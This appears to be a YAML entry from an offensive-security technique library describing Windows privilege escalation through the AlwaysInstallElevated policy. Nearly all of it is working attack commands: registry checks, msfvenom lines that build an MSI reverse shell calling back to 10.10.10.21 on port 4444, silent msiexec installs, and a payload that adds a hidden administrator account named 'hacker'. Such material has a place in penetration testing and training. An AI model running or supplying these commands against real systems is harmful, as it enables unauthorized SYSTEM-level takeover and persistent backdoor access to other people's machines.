---
description: |
  Exploit the AlwaysInstallElevated policy to install a malicious MSI package with SYSTEM privileges. Both HKLM and HKCU registry keys must be set to 1.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Check if AlwaysInstallElevated is enabled
      # ============================================================

      # Both of these must return 0x1 for the exploit to work
      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

      # ============================================================
      # EXPLOIT 1: Reverse shell MSI
      # ============================================================

      # Generate a reverse shell MSI payload (on attacker machine)
      msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f msi -o shell.msi

      # For 32-bit targets
      msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.21 LPORT=4444 -f msi -o shell.msi

      # Transfer shell.msi to target, then install silently
      msiexec /quiet /qn /i C:\Temp\shell.msi

      # ============================================================
      # EXPLOIT 2: Add admin user MSI
      # ============================================================

      # Generate an MSI that adds a new admin user (on attacker machine)
      msfvenom -p windows/exec CMD='net user hacker P@ssw0rd /add && net localgroup Administrators hacker /add' -f msi -o addadmin.msi

      # Transfer addadmin.msi to target, then install silently
      msiexec /quiet /qn /i C:\Temp\addadmin.msi

      # Verify the new admin user was created
      net user hacker
      net localgroup Administrators
phase:
  - PrivEsc
target_os:
  - Windows
services: []
techniques:
  - AlwaysInstallElevated
references:
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated
---
